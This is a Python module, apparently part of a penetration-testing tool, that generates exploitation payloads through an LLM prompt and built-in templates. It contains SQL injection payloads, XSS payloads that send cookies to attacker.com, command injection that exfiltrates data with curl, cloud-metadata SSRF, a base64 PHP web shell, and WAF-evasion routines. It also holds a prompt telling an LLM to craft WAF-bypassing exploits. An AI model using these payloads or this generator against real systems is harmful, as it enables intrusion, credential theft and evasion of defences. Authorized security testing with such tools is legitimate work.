"""
AIPT Adaptive Payload Generator

Uses LLM intelligence to generate context-aware exploitation payloads:
- WAF-aware payload crafting
- Technology-specific payloads
- Learns from failed attempts
- Generates bypass variants

This provides intelligent, adaptive payload generation for exploitation.
"""
from __future__ import annotations

import json
import logging
import os
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional

from aipt_v2.models.findings import VulnerabilityType

logger = logging.getLogger(__name__)


# Built-in payload templates by vulnerability type
PAYLOAD_TEMPLATES = {
    "sql_injection": {
        "detection": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' AND '1'='1",
            "1 AND 1=1",
            "' UNION SELECT NULL--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)#",
        ],
        "union_based": [
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password,NULL FROM users--",
            "-1 UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
        ],
    },
    "xss_reflected": {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
        ],
        "event_handlers": [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
        ],
        "encoded": [
            "<script>alert&#40;1&#41;</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        ],
        "polyglots": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'>><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>",
        ],
    },
    "xss_stored": {
        "basic": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>",
        ],
        "persistent": [
            "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>",
        ],
    },
    "command_injection": {
        "detection": [
            "; id",
            "| id",
            "& id",
            "`id`",
            "$(id)",
            "; sleep 5",
            "| sleep 5",
        ],
        "unix": [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; uname -a",
            "$(cat /etc/passwd)",
        ],
        "windows": [
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "& whoami",
            "| whoami",
        ],
        "blind": [
            "; ping -c 5 attacker.com",
            "| curl https://attacker.com/$(whoami)",
            "; nslookup attacker.com",
        ],
    },
    "ssrf": {
        "localhost": [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "http://localhost:22/",
            "http://localhost:3306/",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
        ],
        "bypass": [
            "http://127.1/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://127.0.0.1.nip.io/",
        ],
    },
    "lfi": {
        "basic": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
        ],
        "encoded": [
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        ],
        "wrappers": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
        ],
    },
}

# WAF bypass techniques
WAF_BYPASS_TECHNIQUES = {
    "cloudflare": {
        "encoding": ["double_url_encode", "unicode", "html_entities"],
        "case_variation": True,
        "null_bytes": True,
        "comment_injection": True,
    },
    "akamai": {
        "encoding": ["unicode", "hex"],
        "case_variation": True,
        "whitespace_variation": True,
    },
    "aws_waf": {
        "encoding": ["double_url_encode"],
        "case_variation": True,
        "comment_injection": True,
    },
    "modsecurity": {
        "encoding": ["unicode", "hex", "html_entities"],
        "comment_injection": True,
        "null_bytes": False,
    },
}


PAYLOAD_GENERATION_PROMPT = """You are an expert penetration tester crafting exploitation payloads.

## Context
- **Vulnerability Type**: {vuln_type}
- **Target URL**: {target_url}
- **Target Parameter**: {parameter}
- **Technology Stack**: {tech_stack}
- **WAF Detected**: {waf}
- **Previous Failed Payloads**: {failed_payloads}

## Objective
{objective}

## Constraints
- Must bypass detected WAF ({waf})
- Must work with technology stack ({tech_stack})
- Avoid patterns that failed before

## Task
Generate 5 optimized payloads that are likely to succeed given the context.
For each payload, explain:
1. The technique used
2. Why it should bypass the WAF
3. How it exploits the vulnerability

## Output Format (JSON)
```json
{{
    "payloads": [
        {{
            "payload": "the actual payload",
            "technique": "technique name",
            "waf_bypass_method": "how it bypasses WAF",
            "explanation": "why this works",
            "confidence": "high|medium|low"
        }}
    ],
    "recommendations": "Additional testing recommendations"
}}
```"""


@dataclass
class GeneratedPayload:
    """A generated exploitation payload."""
    payload: str
    technique: str
    waf_bypass_method: str
    explanation: str
    confidence: str = "medium"
    generated_at: datetime = field(default_factory=datetime.utcnow)

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload,
            "technique": self.technique,
            "waf_bypass_method": self.waf_bypass_method,
            "explanation": self.explanation,
            "confidence": self.confidence,
        }


@dataclass
class PayloadGenerationResult:
    """Result of payload generation."""
    payloads: list[GeneratedPayload]
    recommendations: str
    vuln_type: str
    waf: Optional[str] = None
    generated_at: datetime = field(default_factory=datetime.utcnow)

    def get_high_confidence(self) -> list[GeneratedPayload]:
        """Get only high-confidence payloads."""
        return [p for p in self.payloads if p.confidence == "high"]

    def to_dict(self) -> dict[str, Any]:
        return {
            "payloads": [p.to_dict() for p in self.payloads],
            "recommendations": self.recommendations,
            "vuln_type": self.vuln_type,
            "waf": self.waf,
            "generated_at": self.generated_at.isoformat(),
        }


class AdaptivePayloadGenerator:
    """
    LLM-powered adaptive payload generator.

    Generates context-aware exploitation payloads that:
    - Consider the detected WAF and its known bypasses
    - Adapt to the target technology stack
    - Learn from failed attempts
    - Use multiple encoding/obfuscation techniques

    Example:
        generator = AdaptivePayloadGenerator()

        # Generate payloads for SQLi with CloudFlare WAF
        result = await generator.generate(
            vuln_type="sql_injection",
            target_url="https://example.com/search",
            parameter="q",
            waf="cloudflare",
            tech_stack="php/mysql"
        )

        for payload in result.payloads:
            print(f"Try: {payload.payload}")
            print(f"Technique: {payload.technique}")
    """

    def __init__(
        self,
        llm_provider: str = "anthropic",
        llm_model: str = "claude-3-haiku-20240307",
        use_learning: bool = True,
    ):
        self.llm_provider = llm_provider
        self.llm_model = llm_model
        self.use_learning = use_learning
        self._llm = None
        self._learner = None

    async def _get_llm(self):
        """Get or create LLM client."""
        if self._llm is None:
            try:
                import litellm
                self._llm = litellm
            except ImportError:
                return None
        return self._llm

    def _get_learner(self):
        """Get or create learner instance."""
        if self._learner is None and self.use_learning:
            try:
                from aipt_v2.intelligence.learning import ExploitationLearner
                self._learner = ExploitationLearner()
            except ImportError:
                pass
        return self._learner

    async def generate(
        self,
        vuln_type: str,
        target_url: str = "",
        parameter: str = "",
        waf: str = None,
        tech_stack: str = None,
        failed_payloads: list[str] = None,
        objective: str = "Achieve successful exploitation",
    ) -> PayloadGenerationResult:
        """
        Generate context-aware payloads.

        Args:
            vuln_type: Type of vulnerability (e.g., "sql_injection")
            target_url: Target URL
            parameter: Vulnerable parameter name
            waf: Detected WAF name
            tech_stack: Target technology stack
            failed_payloads: List of payloads that have already failed
            objective: Exploitation objective

        Returns:
            PayloadGenerationResult with generated payloads
        """
        failed_payloads = failed_payloads or []

        # First, try to get historical successful payloads
        learner = self._get_learner()
        historical_payloads = []
        if learner:
            suggestions = learner.get_payload_suggestions(vuln_type, waf=waf, limit=3)
            historical_payloads = [s.payload for s in suggestions if s.success_rate > 0.5]

        # Try LLM generation
        llm = await self._get_llm()
        if llm and self._has_api_key():
            try:
                result = await self._llm_generate(
                    vuln_type, target_url, parameter, waf,
                    tech_stack, failed_payloads, objective
                )
                # Prepend historical successes
                for hp in historical_payloads:
                    if hp not in [p.payload for p in result.payloads]:
                        result.payloads.insert(0, GeneratedPayload(
                            payload=hp,
                            technique="Historical success",
                            waf_bypass_method="Previously successful",
                            explanation="This payload succeeded in similar contexts",
                            confidence="high",
                        ))
                return result
            except Exception as e:
                logger.warning(f"LLM payload generation failed: {e}")

        # Fall back to template-based generation
        return self._template_generate(
            vuln_type, waf, tech_stack, failed_payloads, historical_payloads
        )

    async def _llm_generate(
        self,
        vuln_type: str,
        target_url: str,
        parameter: str,
        waf: str,
        tech_stack: str,
        failed_payloads: list[str],
        objective: str,
    ) -> PayloadGenerationResult:
        """Generate payloads using LLM."""
        llm = await self._get_llm()

        prompt = PAYLOAD_GENERATION_PROMPT.format(
            vuln_type=vuln_type,
            target_url=target_url,
            parameter=parameter,
            tech_stack=tech_stack or "Unknown",
            waf=waf or "None detected",
            failed_payloads=json.dumps(failed_payloads[:10]) if failed_payloads else "None",
            objective=objective,
        )

        model_str = f"{self.llm_provider}/{self.llm_model}"
        if self.llm_provider == "anthropic" and not self.llm_model.startswith("anthropic/"):
            model_str = f"anthropic/{self.llm_model}"

        response = await llm.acompletion(
            model=model_str,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000,
            temperature=0.5,
        )

        return self._parse_llm_response(response.choices[0].message.content, vuln_type, waf)

    def _parse_llm_response(
        self,
        response: str,
        vuln_type: str,
        waf: str,
    ) -> PayloadGenerationResult:
        """Parse LLM response into PayloadGenerationResult."""
        try:
            # Extract JSON
            json_start = response.find("{")
            json_end = response.rfind("}") + 1
            if json_start >= 0 and json_end > json_start:
                data = json.loads(response[json_start:json_end])
            else:
                raise ValueError("No JSON found")

            payloads = []
            for p in data.get("payloads", []):
                payloads.append(GeneratedPayload(
                    payload=p.get("payload", ""),
                    technique=p.get("technique", ""),
                    waf_bypass_method=p.get("waf_bypass_method", ""),
                    explanation=p.get("explanation", ""),
                    confidence=p.get("confidence", "medium"),
                ))

            return PayloadGenerationResult(
                payloads=payloads,
                recommendations=data.get("recommendations", ""),
                vuln_type=vuln_type,
                waf=waf,
            )

        except (json.JSONDecodeError, ValueError) as e:
            logger.warning(f"Failed to parse LLM response: {e}")
            raise

    def _template_generate(
        self,
        vuln_type: str,
        waf: str,
        tech_stack: str,
        failed_payloads: list[str],
        historical_payloads: list[str],
    ) -> PayloadGenerationResult:
        """Generate payloads using templates."""
        templates = PAYLOAD_TEMPLATES.get(vuln_type, {})
        payloads = []

        # Add historical successes first
        for hp in historical_payloads:
            payloads.append(GeneratedPayload(
                payload=hp,
                technique="Historical success",
                waf_bypass_method="Previously successful",
                explanation="This payload succeeded in similar contexts",
                confidence="high",
            ))

        # Add template payloads
        for category, category_payloads in templates.items():
            for payload in category_payloads:
                if payload in failed_payloads:
                    continue
                if len(payloads) >= 10:
                    break

                # Apply WAF bypass if needed
                if waf:
                    payload = self._apply_waf_bypass(payload, waf, vuln_type)

                payloads.append(GeneratedPayload(
                    payload=payload,
                    technique=category,
                    waf_bypass_method=f"Adapted for {waf}" if waf else "None",
                    explanation=f"Standard {vuln_type} payload ({category})",
                    confidence="medium",
                ))

        return PayloadGenerationResult(
            payloads=payloads[:10],
            recommendations=f"Template-based payloads for {vuln_type}",
            vuln_type=vuln_type,
            waf=waf,
        )

    def _apply_waf_bypass(self, payload: str, waf: str, vuln_type: str) -> str:
        """Apply WAF bypass techniques to a payload."""
        waf_config = WAF_BYPASS_TECHNIQUES.get(waf.lower(), {})

        if not waf_config:
            return payload

        modified = payload

        # Apply case variation
        if waf_config.get("case_variation"):
            # Randomly vary case for SQL keywords
            import random
            sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
            for keyword in sql_keywords:
                if keyword.lower() in modified.lower():
                    varied = "".join(
                        c.upper() if random.random() > 0.5 else c.lower()
                        for c in keyword
                    )
                    modified = modified.replace(keyword, varied)
                    modified = modified.replace(keyword.lower(), varied)

        # Apply encoding
        encodings = waf_config.get("encoding", [])
        if "double_url_encode" in encodings and vuln_type in ["sql_injection", "xss_reflected"]:
            # Double URL encode special chars
            import urllib.parse
            modified = urllib.parse.quote(urllib.parse.quote(modified, safe=""), safe="")

        # Apply comment injection for SQL
        if waf_config.get("comment_injection") and vuln_type == "sql_injection":
            # Add inline comments
            modified = modified.replace(" ", "/**/")

        return modified

    def get_detection_payloads(self, vuln_type: str) -> list[str]:
        """Get basic detection payloads for a vulnerability type."""
        templates = PAYLOAD_TEMPLATES.get(vuln_type, {})
        return templates.get("detection", templates.get("basic", []))[:5]

    def _has_api_key(self) -> bool:
        """Check if API key is available."""
        if self.llm_provider == "anthropic":
            return bool(os.getenv("ANTHROPIC_API_KEY"))
        if self.llm_provider == "openai":
            return bool(os.getenv("OPENAI_API_KEY"))
        return False
